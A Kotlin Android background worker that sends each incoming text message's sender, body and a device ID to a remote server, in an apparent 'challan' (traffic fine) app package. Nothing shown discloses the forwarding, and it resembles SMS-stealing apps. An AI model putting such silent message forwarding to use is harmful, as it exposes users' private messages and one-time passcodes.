package com.rte.challan.worker

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import androidx.work.ListenableWorker.Result   // ✅ यह import जरूरी है
import com.rte.challan.network.ApiClient
import com.rte.challan.data.IncomingSmsRequest

class SendIncomingSmsWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {

    override suspend fun doWork(): Result {
        val deviceId = inputData.getString("deviceId") ?: return Result.failure()
        val sender = inputData.getString("sender") ?: return Result.failure()
        val body = inputData.getString("body") ?: return Result.failure()

        val request = IncomingSmsRequest(deviceId, sender, body)

        return try {
            val response = ApiClient.instance.sendIncomingSms(request)
            if (response.isSuccessful) {
                Log.d("IncomingSms", "SMS sent to server")
                Result.success()
            } else {
                Log.e("IncomingSms", "Failed: ${response.code()}")
                Result.retry()
            }
        } catch (e: Exception) {
            Log.e("IncomingSms", "Error: ${e.message}")
            Result.retry()
        }
    }
}
